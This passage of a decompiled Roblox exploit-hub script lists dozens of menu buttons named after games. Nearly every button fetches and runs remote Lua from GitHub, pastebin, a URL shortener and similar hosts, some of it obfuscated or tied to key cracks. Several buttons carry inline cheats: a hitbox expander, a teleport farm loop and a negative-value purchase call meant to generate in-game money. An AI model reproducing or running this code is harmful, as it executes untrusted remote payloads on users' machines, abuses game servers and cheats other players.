          loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/Aqua-Hub/refs/heads/main/100%20Players%20Slippery%20Stair.txt"))()
        end,
      })
      r13_4:AddButton({
        Name = "3. Arm Wrestle Simulator - XAZM Hub",
        Callback = function()
          -- line: [0, 0] id: 680
          loadstring(Game:HttpGet("https://raw.githubusercontent.com/YogaProjectRblx/XAZM-Script-List/refs/heads/main/obf_C0zPSniHJ71T0ZGU2WWNqsQP0K2vq0f18VtZ8AX678c8y44952r42EpmCXbPJI2Y.lua.txt"))()
        end,
      })
      r13_4:AddButton({
        Name = "Arm Wrestle Simulator - Great Script",
        Callback = function()
          -- line: [0, 0] id: 82
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "4. Asylum Life - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 53
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/AsyliumLife.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "5. Ant War - Ywxo Hub",
        Callback = function()
          -- line: [0, 0] id: 547
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ywxoofc/specifier/refs/heads/main/3989869156.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Ant War - Kill Aura",
        Callback = function()
          -- line: [0, 0] id: 477
          loadstring(game:HttpGet("https://pastebin.com/raw/rLYWBte1"))()
        end,
      })
      r13_4:AddButton({
        Name = "Ant War - Spectrum Hub",
        Callback = function()
          -- line: [0, 0] id: 508
          loadstring(game:HttpGet("https://rawscripts.net/raw/Ant-War-HONEYPOT-ANT-and-LOOTING-Spectrum-For-Game-15562"))()
        end,
      })
      r13_4:AddButton({
        Name = "Ant War - Wisl\'i Universal Project",
        Callback = function()
          -- line: [0, 0] id: 320
          loadstring(game:HttpGet("https://raw.githubusercontent.com/wisl884/wisl-i-Universal-Project1/main/Wisl\'i%20Universal%20Project.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "6. A Wolf Or Other - Nexus Hub",
        Callback = function()
          -- line: [0, 0] id: 453
          loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main", true))()
        end,
      })
      r13_4:AddButton({
        Name = "7. Anime Revolution X - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 411
          getgenv().UseKey = "25ms"
          getgenv().KeyMode = nil
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Rev/refs/heads/main/X"))()
        end,
      })
      r13_4:AddButton({
        Name = "8. Anime Training RNG - Nut Hub",
        Callback = function()
          -- line: [0, 0] id: 772
          loadstring(game:HttpGet("https://raw.githubusercontent.com/01iq/me/refs/heads/main/AnimeTrainingRng.txt"))()
        end,
      })
      r13_4:AddButton({
        Name = "9. Anime Strike Simulator - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 8
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/StrikeSol/refs/heads/main/P2"))()
        end,
      })
      r13_4:AddButton({
        Name = "Anime Strike Simulator - Lyzer Hub",
        Callback = function()
          -- line: [0, 0] id: 516
          loadstring(game:HttpGet("https://you.whimper.xyz/lyzer"))()
        end,
      })
      r13_4:AddButton({
        Name = "10. Anime Spirits - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 560
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Sol14/refs/heads/main/k"))()
        end,
      })
      r13_4:AddButton({
        Name = "11. Anime Shadow - Perfectus Hub",
        Callback = function()
          -- line: [0, 0] id: 259
          loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/perfectushub", true))()
        end,
      })
      r13_4:AddButton({
        Name = "12. Avatar Fighting Simulator - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 695
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/av/refs/heads/main/tar"))()
        end,
      })
      r13_4:AddButton({
        Name = "13. Anime Multiverse - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 56
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Mul/refs/heads/main/ver"))()
        end,
      })
      r13_4:AddButton({
        Name = "14. Arcane Conquest - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 519
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/arc/refs/heads/main/ane"))()
        end,
      })
      r13_4:AddButton({
        Name = "15. Anime Geek - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 357
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/pa/refs/heads/main/pi"))()
        end,
      })
      r13_4:AddButton({
        Name = "16. Anime Souls Simulator X - Lyzer Hub",
        Callback = function()
          -- line: [0, 0] id: 172
          loadstring(game:HttpGet("https://you.whimper.xyz/lyzer"))()
        end,
      })
      r13_4:AddButton({
        Name = "17. Aimblox - Big Hitbox",
        Callback = function()
          -- line: [0, 0] id: 581
          _G.HeadSize = 20
          _G.Disabled = true
          game:GetService("RunService").RenderStepped:connect(function()
            -- line: [0, 0] id: 582
            if _G.Disabled then
              local r0_582 = next
              local r1_582, r2_582 = game:GetService("Players"):GetPlayers()
              for r3_582, r4_582 in r0_582, r1_582, r2_582 do
                if r4_582.Name ~= game:GetService("Players").LocalPlayer.Name then
                  pcall(function()
                    -- line: [0, 0] id: 583
                    r4_582.Character.Head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                    r4_582.Character.Head.Transparency = 1
                    r4_582.Character.Head.BrickColor = BrickColor.new("Red")
                    r4_582.Character.Head.Material = "Neon"
                    r4_582.Character.Head.CanCollide = false
                    r4_582.Character.Head.Massless = true
                  end)
                end
                -- close: r3_582
              end
            end
          end)
        end,
      })
      r13_4:AddButton({
        Name = "Aimblox - ESP",
        Callback = function()
          -- line: [0, 0] id: 442
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      r13_4:AddButton({
        Name = "18. Answer Or Die - Auto Answer, etc.",
        Callback = function()
          -- line: [0, 0] id: 207
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "19. Airport Tycoon - Redeem All Codes",
        Callback = function()
          -- line: [0, 0] id: 88
          loadstring(game:HttpGet("https://pastebin.com/raw/XVjj3RAU"))()
        end,
      })
      r13_4:AddButton({
        Name = "Airport Tycoon - Good Script",
        Callback = function()
          -- line: [0, 0] id: 521
          loadstring(game:HttpGet("https://pastebin.com/raw/JBRTv6Mp"))()
        end,
      })
      r13_4:AddButton({
        Name = "20. Blue Lock: Rivals - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 179
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/fo/refs/heads/main/ot"))()
        end,
      })
      r13_4:AddButton({
        Name = "Blue Lock: Rivals - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 242
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Blue Lock: Rivals - Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 149
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/refs/heads/main/TbaoHubBlueLockRivals"))()
        end,
      })
      r13_4:AddButton({
        Name = "Blue Lock: Rivals - Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 693
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
        end,
      })
      r13_4:AddButton({
        Name = "21. Blades & Buffoonery - Sonder Hub",
        Callback = function()
          -- line: [0, 0] id: 502
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Sonder-hub/SonderUI/main/Main"))()
        end,
      })
      r13_4:AddButton({
        Name = "Blades & Buffoonery - AirSoft",
        Callback = function()
          -- line: [0, 0] id: 605
          loadstring(game:HttpGet("https://raw.githubusercontent.com/LarsScripts/Airsoft/refs/heads/main/FE", true))()
        end,
      })
      r13_4:AddButton({
        Name = "22. Booga Booga Reborn - Script",
        Callback = function()
          -- line: [0, 0] id: 16
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CheeseOnGithub/scripts/main/bb2019.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "Booga Booga Reborn - Another Script",
        Callback = function()
          -- line: [0, 0] id: 700
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Iumentis/PublicScripts/main/BBR", true))()
        end,
      })
      r13_4:AddButton({
        Name = "23. Better Music - Bacon Hacks",
        Callback = function()
          -- line: [0, 0] id: 750
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BetterMusic"))()
        end,
      })
      r13_4:AddButton({
        Name = "24. Be A Parkour Ninja - Hitbox Expander",
        Callback = function()
          -- line: [0, 0] id: 169
          loadstring(game:HttpGet("https://pastebin.com/raw/9Bbjvv2b"))()
        end,
      })
      r13_4:AddButton({
        Name = "Be A Parkour Ninja - Player Hub",
        Callback = function()
          -- line: [0, 0] id: 377
          loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "25. Building Architect - Bangger Hub",
        Callback = function()
          -- line: [0, 0] id: 266
          loadstring(game:HttpGet("https://pastebin.com/raw/i8ThRrCW"))()
        end,
      })
      r13_4:AddButton({
        Name = "26. Busy Business - Only Autofarm",
        Callback = function()
          -- line: [0, 0] id: 273
          loadstring(game:HttpGet("https://pastebin.com/raw/Fq8g9Xw9"))()
        end,
      })
      r13_4:AddButton({
        Name = "Busy Business - Very Good Script",
        Callback = function()
          -- line: [0, 0] id: 465
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceCat1748/Boblox/main/BB.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "27. Blocks n\' Props - Exordum Hub",
        Callback = function()
          -- line: [0, 0] id: 168
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Booger-Aids-V2/Exordum/refs/heads/main/Blocks%20n\'%20Props"))()
        end,
      })
      r13_4:AddButton({
        Name = "28. Be Crushed By A Speeding Wall - Pandora Hub",
        Callback = function()
          -- line: [0, 0] id: 216
          loadstring(game:HttpGet("https://raw.githubusercontent.com/pandoraSOI/PandoraHub/refs/heads/main/pandora_hub_Wall.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "Be Crushed By A Speeding Wall - Insanity Badge Farm",
        Callback = function()
          -- line: [0, 0] id: 580
          loadstring(game:HttpGet("https://pastebin.com/raw/U9uKgXXE"))()
        end,
      })
      r13_4:AddButton({
        Name = "29. Bridge Duels - Msedge (Ban Risk!)",
        Callback = function()
          -- line: [0, 0] id: 27
          loadstring(game:HttpGet("https://raw.githubusercontent.com/IIIllllIIIIIllllllI/BridgeDuel/refs/heads/main/main.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Bridge Duels - Lime Client (Ban Risk!)",
        Callback = function()
          -- line: [0, 0] id: 34
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AfgMS/LimeForRoblox/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "30. Blackhawk Rescue Mission 5 - Players ESP",
        Callback = function()
          -- line: [0, 0] id: 138
          loadstring(game:HttpGet("https://raw.githubusercontent.com/iAmEpsonPrinter/brm5pvpesp/refs/heads/main/main.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "31. Blox Hunt - Good Script",
        Callback = function()
          -- line: [0, 0] id: 554
          loadstring(game:HttpGet("https://pastebin.com/raw/wJw57ccR"))()
        end,
      })
      r13_4:AddButton({
        Name = "32. Backpacking - Auto Farm Marshmallows",
        Callback = function()
          -- line: [0, 0] id: 613
          loadstring(game:HttpGet("https://pastebin.com/raw/vi1tjkkw"))()
        end,
      })
      r13_4:AddButton({
        Name = "34. Creatures Of Sonaria - FrostByte Hub",
        Callback = function()
          -- line: [0, 0] id: 233
          loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "35. Craftblox - Expensive",
        Callback = function()
          -- line: [0, 0] id: 658
          loadstring(game:HttpGet("https://pastebin.com/raw/G1303xDB"))()
        end,
      })
      r13_4:AddButton({
        Name = "Key For Expensive (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 550
          setclipboard("F9L3jd03FlbsoSJF8")
        end,
      })
      r13_4:AddButton({
        Name = "36. Climb 1K Stairs - Autofarm",
        Callback = function()
          -- line: [0, 0] id: 712
          loadstring(game:HttpGet("https://github.com/KhSaeed90/Roblox/raw/workspace/5702593762"))()
        end,
      })
      r13_4:AddButton({
        Name = "37. Cursed Islands - Always Win",
        Callback = function()
          -- line: [0, 0] id: 241
          loadstring(game:HttpGet("https://pastebin.com/raw/tgvMTR2i"))()
        end,
      })
      r13_4:AddButton({
        Name = "Cursed Islands - Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 69
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r13_4:AddButton({
        Name = "38. Chained - Developer Hub",
        Callback = function()
          -- line: [0, 0] id: 497
          loadstring(game:HttpGet("https://pastebin.com/raw/PUSfPTqu"))()
        end,
      })
      r13_4:AddButton({
        Name = "39. Cali Shootout - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 46
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Cali Shootout - Teeksaw Hub",
        Callback = function()
          -- line: [0, 0] id: 114
          loadstring(game:HttpGet("https://pastebin.com/raw/mm9aVceN"))()
        end,
      })
      r13_4:AddButton({
        Name = "40. Cursed Arena - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 439
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/CA2/main/Solara"))()
        end,
      })
      r13_4:AddButton({
        Name = "Cursed Arena - Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 163
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r13_4:AddButton({
        Name = "41. City Defense Tycoon - OP Script",
        Callback = function()
          -- line: [0, 0] id: 452
          loadstring(game:HttpGet("https://raw.githubusercontent.com/agreed69-scripts/open-src-scripts/refs/heads/main/City%20Defense.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "42. Criminal Vs SWAT - The Darkones Hub",
        Callback = function()
          -- line: [0, 0] id: 249
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Swat%20Vs%20Crims%20GUI"))()
        end,
      })
      r13_4:AddButton({
        Name = "43. Cabin Crew Simulator - Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 164
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r13_4:AddButton({
        Name = "44. Centaura - Global Hub",
        Callback = function()
          -- line: [0, 0] id: 656
          getgenv().new_ui = true
          loadstring(game:HttpGet("https://shorturl.at/RNzPa"))()
        end,
      })
      r13_4:AddButton({
        Name = "45. Creature Chaos - Nobulem Hub",
        Callback = function()
          -- line: [0, 0] id: 538
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NBLMSCRIPTS/NBLMSCRIPTHUB/main/SKIBIDI"))()
        end,
      })
      r13_4:AddButton({
        Name = "46. Car Training - SORx1 Hub",
        Callback = function()
          -- line: [0, 0] id: 576
          loadstring(game:HttpGet("https://pastebin.com/raw/tBxWC1e9"))()
        end,
      })
      r13_4:AddButton({
        Name = "48. Destruction Simulator - Waza Hub",
        Callback = function()
          -- line: [0, 0] id: 225
          loadstring(game:HttpGet("https://waza-scripts.vercel.app/script/DestructionSimulator"))()
        end,
      })
      r13_4:AddButton({
        Name = "49. Defusal FPS - Good Script",
        Callback = function()
          -- line: [0, 0] id: 678
          loadstring(game:HttpGet("https://waza-scripts.vercel.app/script/DestructionSimulator"))()
        end,
      })
      r13_4:AddButton({
        Name = "50. Desert Detectors - Hughs Hub",
        Callback = function()
          -- line: [0, 0] id: 197
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Christo140213/File/refs/heads/main/DDScript.txt"))()
        end,
      })
      r13_4:AddButton({
        Name = "Desert Detectors - Get Money (Ban Risk!)",
        Callback = function()
          -- line: [0, 0] id: 389
          game:GetService("ReplicatedStorage").Purchase_Crate:FireServer(-(50000000 / 120))
        end,
      })
      r13_4:AddButton({
        Name = "51. Dig It - Nixius.xyz",
        Callback = function()
          -- line: [0, 0] id: 21
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Dig It - FrostByte Hub",
        Callback = function()
          -- line: [0, 0] id: 71
          loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "52. Drill Digging Simulator - Good Script",
        Callback = function()
          -- line: [0, 0] id: 279
          getgenv().Color = "default"
          getgenv().TextColor = "default"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "Drill Digging Simulator - Tora Hub",
        Callback = function()
          -- line: [0, 0] id: 510
          loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/DrillDigging"))()
        end,
      })
      r13_4:AddButton({
        Name = "Drill Digging Simulator - Scarab Hub",
        Callback = function()
          -- line: [0, 0] id: 414
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scarabhub/Drill-Digging-Simulator/refs/heads/main/main.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Drill Digging Simulator - Wins Farm",
        Callback = function()
          -- line: [0, 0] id: 403
          local r0_403 = game:GetService("Players").LocalPlayer
          function tp(r0_404, r1_404, r2_404)
            -- line: [0, 0] id: 404
            r0_403.Character.HumanoidRootPart.CFrame = CFrame.new(r0_404, r1_404, r2_404)
          end
          for r4_403 = 1, 100, 1 do
            tp(-5055.26514, 9557.18945, -273.38324)
            task.wait(0.1)
            tp(4339.82715, 9557.08984, 23.2330017)
            task.wait(0.1)
            tp(9120.82812, 9557.11719, 23.2330017)
            task.wait(0.1)
            tp(9153.16406, 6913.84668, 124.181267)
            task.wait(0.3)
          end
        end,
      })
      r13_4:AddButton({
        Name = "Drill Digging Simulator - Doggo\'s Hub",
        Callback = function()
          -- line: [0, 0] id: 444
          loadstring(game:HttpGet("https://pastebin.com/raw/eNLAuisd"))()
        end,
      })
      r13_4:AddButton({
        Name = "53. Expedition Antarctica - Samuraa1 Hub",
        Callback = function()
          -- line: [0, 0] id: 631
          loadstring(game:HttpGet("https://raw.githubusercontent.com/samuraa1/Samuraa1-Hub/refs/heads/main/Expedition-Antarctica.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "54. Elemental Battlegrounds - Catware",
        Callback = function()
          -- line: [0, 0] id: 200
          loadstring(game:HttpGet("https://rawscripts.net/raw/scripte_1034", true))()
        end,
      })
      r13_4:AddButton({
        Name = "55. Elemental Dungeons - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 503
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/typo/main/ye"))()
        end,
      })
      r13_4:AddButton({
        Name = "56. Escape Running Head - HKR Hub",
        Callback = function()
          -- line: [0, 0] id: 99
          loadstring(game:HttpGet("https://pastebin.com/raw/f8iw7cKv"))()
        end,
      })
      r13_4:AddButton({
        Name = "Escape Running Head - Good Script",
        Callback = function()
          -- line: [0, 0] id: 341
          loadstring(game:HttpGet("https://pastebin.com/raw/bL3V7NM2"))()
        end,
      })
      r13_4:AddButton({
        Name = "Escape Running Head - BootTrap Hub",
        Callback = function()
          -- line: [0, 0] id: 268
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/TheExploiterBoy/New-Script/main/Escape Running Head"))()
        end,
      })
      r13_4:AddButton({
        Name = "57. ENTRENCHED WW1 - Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 236
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "ENTRENCHED WW1 - Self Ware",
        Callback = function()
          -- line: [0, 0] id: 38
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/79517e2cf56e2e40d7380ee3ce572f42.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "58. Energy Assault FPS - Aimbot And ESP",
        Callback = function()
          -- line: [0, 0] id: 438
          loadstring(game:HttpGet("https://pastebin.com/raw/warggu6s"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      r13_4:AddButton({
        Name = "59. Entry Point - InfilSense Hub (Right Shift To Close)",
        Callback = function()
          -- line: [0, 0] id: 61
          loadstring(game:HttpGet("https://raw.githubusercontent.com/bkkpro1980/InfilSense/main/main.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "60. Forsaken - Apple Ware",
        Callback = function()
          -- line: [0, 0] id: 619
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SilkScripts/AppleStuff/refs/heads/main/AppleFSKV2"))()
        end,
      })
      r13_4:AddButton({
        Name = "Forsaken - FartSaken Hub",
        Callback = function()
          -- line: [0, 0] id: 76
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ivannetta/ShitScripts/refs/heads/main/forsaken.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Forsaken - Lucky Ware",
        Callback = function()
          -- line: [0, 0] id: 58
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/58b52abb25606af68adcd5c0ce248c92.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Forsaken - Photon Hub",
        Callback = function()
          -- line: [0, 0] id: 732
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NittarPP/PhotonScript/refs/heads/main/Loading/Loading.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Forsaken - Forsakontol",
        Callback = function()
          -- line: [0, 0] id: 110
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Forsakontol/refs/heads/main/Top_Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "61. FORTLINE - Kill All",
        Callback = function()
          -- line: [0, 0] id: 12
          loadstring(game:HttpGet("https://gist.githubusercontent.com/ExploiterGuy/4d95c83a854d6e7265a43094219d0b00/raw/8bc8d511803b2e5b2a1b6abe70c6e1c994601323/%255B%25F0%259F%2594%25AB%255D%2520Fortline"))()
        end,
      })
      r13_4:AddButton({
        Name = "62. Fruit Battlegrounds - Dracula Hub",
        Callback = function()
          -- line: [0, 0] id: 5
          getgenv().KeyMode = 2
          getgenv().AllowAnyKey = true
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/KeyGuardianBeta"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MortezaPlay/dd/refs/heads/main/MainHUB"))()
        end,
      })
      r13_4:AddButton({
        Name = "Fruit Battlegrounds - Kater Hub",
        Callback = function()
          -- line: [0, 0] id: 396
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KATERGaming/Roblox/main/KaterHub.Lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "63. Farm For Fun! - Bacon Hacks",
        Callback = function()
          -- line: [0, 0] id: 615
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/FarmforFun"))()
        end,
      })
      r13_4:AddButton({
        Name = "Farm For Fun! - ExploitFin",
        Callback = function()
          -- line: [0, 0] id: 685
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/Scriptblox-ExploitFin/refs/heads/main/Farm%20For%20Fun!"))()
        end,
      })
      r13_4:AddButton({
        Name = "64. Fabled Legacy! RPG - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 422
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/FL/main/Solara"))()
        end,
      })
      r13_4:AddButton({
        Name = "65. [FREE ADMIN] - Poopy Hax",
        Callback = function()
          -- line: [0, 0] id: 775
          loadstring(game:HttpGet("https://rawscripts.net/raw/FREE-ADMIN-free-admin-script-ahh-30681"))()
        end,
      })
      r13_4:AddButton({
        Name = "66. Find The Button - Great Script",
        Callback = function()
          -- line: [0, 0] id: 737
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "67. GEF - Madbuk Scripts",
        Callback = function()
          -- line: [0, 0] id: 41
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MadbukScripts/Scripts/main/Obfuscated%20Gef.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "GEF - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 572
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/GEF.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "68. Greenville - Script",
        Callback = function()
          -- line: [0, 0] id: 196
          loadstring(game:HttpGet("https://raw.githubusercontent.com/typical-overk1ll/scripts/main/Greenville", true))()
        end,
      })
      r13_4:AddButton({
        Name = "69. Guts & Blackpowder - Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 451
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Grace - God Mode",
        Callback = function()
          -- line: [0, 0] id: 635
          loadstring(game:HttpGet("https://pastebin.com/raw/ygmm6nwg"))()
        end,
      })
      r13_4:AddButton({
        Name = "Grace - Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 638
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r13_4:AddButton({
        Name = "71. Giant Survival - Very Good Script",
        Callback = function()
          -- line: [0, 0] id: 464
          loadstring(game:HttpGet("https://pastebin.com/raw/CXWBz0jb"))()
        end,
      })
      r13_4:AddButton({
        Name = "Giant Survival - Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 59
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "72. Go Fishing - Eqha Hub",
        Callback = function()
          -- line: [0, 0] id: 518
          loadstring(game:HttpGet("https://raw.githubusercontent.com/emwmelchi/gofishing/refs/heads/main/main"))()
        end,
      })
      r13_4:AddButton({
        Name = "Go Fishing - Projeto LKB",
        Callback = function()
          -- line: [0, 0] id: 484
          loadstring(game:HttpGet("https://raw.githubusercontent.com/zk0o/Go-Fishing-Script/refs/heads/main/Projeto%20LKB"))()
        end,
      })
      r13_4:AddButton({
        Name = "Go Fishing - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 673
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/GoFishing.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Go Fishing - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 696
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/go/refs/heads/main/is"))()
        end,
      })
      r13_4:AddButton({
        Name = "73. Hoopz - Script",
        Callback = function()
          -- line: [0, 0] id: 335
          loadstring(game:HttpGet("https://scriptblox.com/raw/Hoopz-VEHICLES-(Basketball)-Best-Hoopz-OP-Script-2152"))()
        end,
      })
      r13_4:AddButton({
        Name = "Hoopz - Voidz Hub",
